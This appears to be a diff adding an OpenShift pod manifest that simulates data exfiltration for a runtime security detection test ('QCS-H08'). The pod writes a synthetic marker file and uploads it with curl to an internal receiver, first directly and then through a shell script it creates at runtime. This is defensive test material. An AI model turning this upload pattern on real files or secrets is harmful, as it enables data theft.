@@ -1,0 +1,50 @@
+# QCS-H08 — Controlled Data Transfer / Exfiltration Simulation
+# CRS version support: 1.45+ — v1 file-open + net-tcp-open cover it
+#
+# Pod carrying a synthetic payload file that reads it and uploads it to the
+# approved internal receiver, then repeats via a script created at runtime.
+# Egress should be restricted to the receiver via OpenShift egress controls.
+apiVersion: v1
+kind: Namespace
+metadata:
+  name: citi-h08
+---
+apiVersion: v1
+kind: Pod
+metadata:
+  name: citi-h08-source
+  namespace: citi-h08
+  labels:
+    app: citi-h08-source
+spec:
+  restartPolicy: Never
+  containers:
+  - name: source
+    image: registry.access.redhat.com/ubi9/ubi:latest
+    command:
+    - sh
+    - -c
+    - |
+      MARKER="CITI-H08-$(date +%s)"
+      DEST=http://citi-h08-receiver.citi-h08-recv.svc.cluster.local:8080
+      echo "synthetic-payload $MARKER" > /tmp/citi-h08-payload.txt
+
+      # direct upload
+      curl -s --upload-file /tmp/citi-h08-payload.txt "$DEST/upload1" || true
+
+      # same transfer performed by a runtime-created script
+      cat > /tmp/citi-h08-upload.sh <<EOF
+      #!/bin/sh
+      curl -s --upload-file /tmp/citi-h08-payload.txt "$DEST/upload2" || true
+      EOF
+      chmod +x /tmp/citi-h08-upload.sh
+      /tmp/citi-h08-upload.sh
+
+      sleep 3600
+    securityContext:
+      allowPrivilegeEscalation: false
+      capabilities:
+        drop: ["ALL"]
+      runAsNonRoot: true
+      seccompProfile:
+        type: RuntimeDefault
